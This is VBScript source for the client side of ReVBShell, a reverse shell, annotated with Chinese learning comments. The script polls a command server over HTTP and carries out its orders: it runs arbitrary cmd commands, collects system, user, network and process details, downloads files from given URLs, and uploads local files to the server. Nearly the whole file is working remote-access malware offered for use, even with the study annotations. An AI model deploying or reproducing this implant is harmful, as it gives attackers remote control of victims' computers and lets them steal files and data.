' This software is provided under under the BSD 3-Clause License.
' See the accompanying LICENSE file for more information.
'
' Client for Reverse VBS Shell
'
' Author:
'  Arris Huijgen
'
' Website:
'  https://github.com/bitsadmin/ReVBShell
'
'
Option Explicit
On Error Resume Next

' Instantiate objects、
' CreateObject创建一个对ActiveX对象的引用
' 创建WScript.Shell对象
Dim shell: Set shell = CreateObject("WScript.Shell")
' 创建FileSystem对象
Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
' 获取一个wmic对象 https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee198932(v=technet.10)?redirectedfrom=MSDN
' 其实这行代码我也没太看懂
Dim wmi: Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
' 创建一个HTTP对象
' HTTP对象的相关文档 https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-open
Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
' 如果第一个HTTP对象创建不成功，则尝试创建其他的HTTP对象
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

' Initialize variables used by GET/WGET
' 先初始化这三个变量，待会儿会用到
Dim arrSplitUrl, strFilename, stream

' Configuration
Dim strHost, strPort, strUrl, strCD, intSleep
strHost = "127.0.0.1"
strPort = "8080"
intSleep = 5000
strUrl = "http://" & strHost & ":" & strPort
strCD =  "."

' Periodically poll for commands
' 这个脚本采用的机制是定时轮询，查看是否有命令需要执行
Dim strInfo
While True
    ' Fetch next command
    ' 通过HTTP的方式获取一条命令，第三个参数是异步选项，False表示同步，即阻塞，第一个参数为请求方式，第二个为请求的URL
    ' 这两行代码是发送请求的标准代码
    http.Open "GET", strUrl & "/", False
    http.Send
    Dim strRawCommand
    ' 获取响应
    strRawCommand = http.ResponseText

    ' Determine command and arguments
    ' 根据接收到的字符串来判断要进行什么样的操作
    Dim arrResponseText, strCommand, strArgument
    ' 使用空格将响应内容分割成两部分，注意第三个参数2，也就是说，不管字符串中有多少个空格，只会按照发现的第一个空格分割成两部分
    arrResponseText = Split(strRawCommand, " ", 2)
    strCommand = arrResponseText(0)
    strArgument = ""
    ' UBound函数用于返回数组大小，就是验证一下是否为空，如果有命令正确传送的话，这个值应该是2
    If UBound(arrResponseText) > 0 Then
        ' 第二部分的作用根据第一部分的指令确定
        strArgument = arrResponseText(1)
    End If

    ' Fix ups
    ' 因为这两条命令是不需要参数的，所以需要重新修改一下指令，并把参数置空
    If strCommand = "PWD" Or strCommand = "GETWD" Then
        strCommand = "CD"
        strArgument = ""
    End If

    ' Execute command
    ' Select Case就是其他高级语言中的switch
    Select Case strCommand
        ' Sleep X seconds
        ' 这个NOOP字符串是server.py在没有命令发送时自动发送的一个字符串，表示当期没有命令，所以当客户端的vbs接收到该字符串之后，只需要睡眠5s，然后再继续循环即可
        Case "NOOP"
            ' 默认是睡眠5s
            WScript.Sleep intSleep
        
        ' Get host info
        Case "SYSINFO"
            Dim objOS, strComputer, strOS, strBuild, strServicePack, strArchitecture, strLanguage
            For Each objOS in wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
               strComputer = objOS.CSName
               strOS = objOS.Caption
               strBuild = objOS.BuildNumber
               strServicePack = objOS.CSDVersion
               strArchitecture = objOS.OSArchitecture
               strLanguage = objOS.OSLanguage
               Exit For
            Next

            Dim strVersion
            strVersion = strOS & " (Build " & strBuild
            If strServicePack <> "" Then
                strVersion = strVersion & ", " & strServicePack
            End If
            strVersion = strVersion & ")"
            
            strInfo = "Computer: " & strComputer & vbCrLf & _
                      "OS: " & strVersion & vbCrLf & _
                      "Architecture: " & strArchitecture & vbCrLf & _
                      "System Language: " & strLanguage

            SendStatusUpdate strRawCommand, strInfo

        ' Current user, including domain
        Case "GETUID"
            Dim strUserDomain, strUsername
            strUserDomain = shell.ExpandEnvironmentStrings("%USERDOMAIN%")
            strUsername = shell.ExpandEnvironmentStrings("%USERNAME%")
            strInfo = "Username: " & strUserDomain & "\" & strUserName
            
            SendStatusUpdate strRawCommand, strInfo

        ' IP configuration
        Case "IFCONFIG"
            Dim arrNetworkAdapters: Set arrNetworkAdapters = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress > ''")
            Dim objAdapter
            strInfo = ""
            For Each objAdapter In arrNetworkAdapters
                strInfo = strInfo & objAdapter.Description & vbCrLf
                If IsArray(objAdapter.IPAddress) Then
                    strInfo = strInfo & Join(objAdapter.IPAddress, vbCrLf) & vbCrLf & vbCrLf
                Else
                    strInfo = strInfo & "[Interface down]" & vbCrLf & vbCrLf
                End If
            Next

            ' Remove trailing \r\n's
            strInfo = Mid(strInfo, 1, Len(strInfo)-4)

            SendStatusUpdate strRawCommand, strInfo

        ' Process list
        Case "PS"
            Dim arrProcesses: Set arrProcesses = wmi.ExecQuery("SELECT * FROM Win32_Process")
            strInfo = PadRight("PID", 5) & "  " & PadRight("Name", 24) & "  " & "Session" & "  " & PadRight("User", 19) & "  " & "Path" & vbCrLf & _
                      PadRight("---", 5) & "  " & PadRight("----", 24) & "  " & "-------" & "  " & PadRight("----", 19) & "  " & "----" & vbCrLf
            Dim objProcess, strPID, strName, strSession, intHresult, strPDomain, strPUsername, strDomainUser, strPath
            For Each objProcess In arrProcesses
                strPID = objProcess.Handle
                strName = objProcess.Name
                strSession = objProcess.SessionId
                intHresult = objProcess.GetOwner(strPUsername, strPDomain)
                Select Case intHresult
                    Case 0
                        strDomainUser = strPDomain & "\" & strPUsername
                    Case 2
                        strDomainUser = "[Access Denied]"
                    Case 3
                        strDomainUser = "[Insufficient Privilege]"
                    Case 8
                        strDomainUser = "[Unknown Failure]"
                    Case Else
                        strDomainUser = "[Other]"
                End Select
                
                strPath = objProcess.ExecutablePath

                strInfo = strInfo & PadRight(strPid, 5) & "  " & PadRight(strName, 24) & "  " & PadRight(strSession, 7) & "  " & PadRight(strDomainUser, 19) & "  " & strPath & vbCrLf
            Next

            ' Remove trailing newline
            strInfo = Mid(strInfo, 1, Len(strInfo)-2)

            SendStatusUpdate strRawCommand, strInfo

        ' Set sleep time
        Case "SLEEP"
            If strArgument <> "" Then
                intSleep = CInt(strArgument)
                SendStatusUpdate strRawCommand, "Sleep set to " & strArgument & "ms"
            Else
                Dim strSleep
                strSleep = CStr(intSleep)
                SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
                strSleep = Empty
            End If
        
        ' Execute command
        Case "SHELL"
            'Execute and write to file
            Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
            shell.Run "cmd /C pushd """ & strCD & """ && " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True

            ' Read out file
            Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
            Dim text
            If Not file.AtEndOfStream Then
                text = file.ReadAll
            Else
                text = "[empty result]"
            End If
            file.Close
            fs.DeleteFile strOutFile, True

            ' Set response
            SendStatusUpdate strRawCommand, text

            ' Clean up
            strOutFile = Empty
            text = Empty

        ' Change Directory
        Case "CD"
            ' Only change directory when argument is provided
            If Len(strArgument) > 0 Then
                Dim strNewCdPath
                strNewCdPath = GetAbsolutePath(strArgument)

                If fs.FolderExists(strNewCdPath) Then
                    strCD = strNewCdPath
                End If
            End If

            SendStatusUpdate strRawCommand, strCD

        ' Download a file from a URL
        Case "WGET"
            ' Determine filename
            arrSplitUrl = Split(strArgument, "/")
            strFilename = arrSplitUrl(UBound(arrSplitUrl))
            strFilename = GetAbsolutePath(strFilename)

            ' Fetch file
            Err.Clear() ' Set error number to 0
            http.Open "GET", strArgument, False
            http.Send

            If Err.number <> 0 Then
                SendStatusUpdate strRawCommand, "Error when downloading from " & strArgument & ": " & Err.Description
            Else
                ' Write to file
                Set stream = createobject("Adodb.Stream")
                With stream
                    .Type = 1 'adTypeBinary
                    .Open
                    .Write http.ResponseBody
                    .SaveToFile strFilename, 2 'adSaveCreateOverWrite
                End With

                ' Set response
                SendStatusUpdate strRawCommand, "File download from " & strArgument & " successful."
            End If

            ' Clean up
            arrSplitUrl = Array()
            strFilename = Empty

        ' Send a file to the server
        Case "DOWNLOAD"
            Dim strFullSourceFilePath
            strFullSourceFilePath = GetAbsolutePath(strArgument)

            ' Only download if file exists
            If fs.FileExists(strFullSourceFilePath) Then
                ' Determine filename
                arrSplitUrl = Split(strFullSourceFilePath, "\")
                strFilename = arrSplitUrl(UBound(arrSplitUrl))

                ' Read the file to memory
                Set stream = CreateObject("Adodb.Stream")
                stream.Type = 1 ' adTypeBinary
                stream.Open
                stream.LoadFromFile strFullSourceFilePath
                Dim binFileContents
                binFileContents = stream.Read

                ' Upload file
                DoHttpBinaryPost "upload", strRawCommand, strFilename, binFileContents

                ' Clean up
                binFileContents = Empty
            ' File does not exist
            Else
                SendStatusUpdate strRawCommand, "File does not exist: " & strFullSourceFilePath
            End If

            ' Clean up
            arrSplitUrl = Array()
            strFilename = Empty
            strFullSourceFilePath = Empty

        ' Self-destruction, exits script
        Case "KILL"
            SendStatusUpdate strRawCommand, "Goodbye!"
            WScript.Quit 0

        ' Unknown command
        Case Else
            SendStatusUpdate strRawCommand, "Unknown command"
    End Select

    ' Clean up
    strRawCommand = Empty
    arrResponseText = Array()
    strCommand = Empty
    strArgument = Empty
    strInfo = Empty
Wend

' 该函数主要用来格式化输出
Function PadRight(strInput, intLength)
    Dim strOutput
    ' vbs中&符号可用来拼接字符串
    ' Left函数为从字符串左侧截取指定数量的字符
    ' Space函数用于返回特定数目的空格
    strOutput = LEFT(strInput & Space(intLength), intLength)
    ' String函数可以重复指定字符intLength次，String(intLength, " ")会生成一个包含intLength个空格的字符串
    ' strOutput = LEFT(strOutput & String(intLength, " "), intLength)
    ' 上面两行代码的作用是相同的，把第二行注释掉即可
    PadRight = strOutput
End Function


Function GetAbsolutePath(strPath)
    Dim strOutputPath
    strOutputPath = ""

    ' Use backslashes
    strPath = Replace(strPath, "/", "\")

    ' Absolute paths : \Windows C:\Windows D:\
    ' Relative paths: .. ..\ .\dir .\dir\ dir dir\ dir1\dir2 dir1\dir2\
    If Left(strPath, 1) = "\" Or InStr(1, strPath, ":") <> 0 Then
        strOutputPath = strPath
    Else
        strOutputPath = strCD & "\" & strPath
    End If

    GetAbsolutePath = fs.GetAbsolutePathName(strOutputPath)
End Function


Function SendStatusUpdate(strText, strData)
    Dim binData
    binData = StringToBinary(strData)
    DoHttpBinaryPost "cmd", strText, "cmdoutput", binData
End Function


Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
    ' Compile POST headers and footers
    Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
    Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated
    binTextHeader = StringToBinary("--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""cmd""" & vbCrLf & vbCrLf)
    binDataHeader = StringToBinary(vbCrLf & _
                                   "--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""result""; filename=""" & strFilename & """" & vbCrLf & _
                                   "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)
    binFooter = StringToBinary(vbCrLf & "--" & strBoundary & "--" & vbCrLf)

    ' Convert command to binary
    binText = StringToBinary(strText)

    ' Concatenate POST headers, data elements and footer
    Dim stream : Set stream = CreateObject("Adodb.Stream")
    stream.Open
    stream.Type = 1 ' adTypeBinary
    stream.Write binTextHeader
    stream.Write binText
    stream.Write binDataHeader
    stream.Write binData
    stream.Write binFooter
    stream.Position = 0
    binConcatenated = stream.Read(stream.Size)

    ' Post data
    http.Open "POST", strUrl & "/" & strActionType, False
    http.SetRequestHeader "Content-Length", LenB(binConcatenated)
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
    http.SetTimeouts 5000, 60000, 60000, 60000
    http.Send binConcatenated
    
    ' Receive response
    DoHttpBinaryPost = http.ResponseText
End Function

' 该函数用于将字符串转换成二进制数据
Function StringToBinary(Text)
    Dim stream: Set stream = CreateObject("Adodb.Stream")
    stream.Type = 2 'adTypeText
    ' stream.CharSet = "us-ascii"

    ' Store text in stream
    stream.Open
    stream.WriteText Text

    ' Change stream type To binary
    stream.Position = 0
    stream.Type = 1 'adTypeBinary
  
    ' Return binary data
    StringToBinary = stream.Read
End Function
